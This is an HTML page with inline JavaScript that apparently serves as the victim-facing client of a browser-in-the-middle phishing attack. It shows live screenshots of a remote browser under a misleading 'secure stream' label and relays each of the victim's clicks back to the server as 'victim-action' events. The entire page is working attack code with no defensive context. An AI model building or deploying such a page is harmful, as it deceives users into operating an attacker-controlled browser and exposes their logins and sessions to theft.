<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #mirror { max-width: 100%; max-height: 100%; object-fit: contain; display: none; touch-action: none; }
        #loader { color: #444; font-family: sans-serif; }
    </style>
</head>
<body>
    <div id="loader">INITIALIZING_SECURE_STREAM...</div>
    <img id="mirror" draggable="false" />
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        const socket = io({ transports: ['websocket'] });
        const img = document.getElementById('mirror');
        const loader = document.getElementById('loader');

        socket.on('browser-render', (data) => {
            if (data.screenshot) {
                loader.style.display = 'none';
                img.style.display = 'block';
                img.src = 'data:image/jpeg;base64,' + data.screenshot;
            }
        });

        img.addEventListener('pointerdown', (e) => {
            const r = img.getBoundingClientRect();
            socket.emit('victim-action', { 
                type: 'click', 
                x: (e.clientX - r.left) * (1280 / r.width), 
                y: (e.clientY - r.top) * (720 / r.height) 
            });
        });
    </script>
</body>
</html>
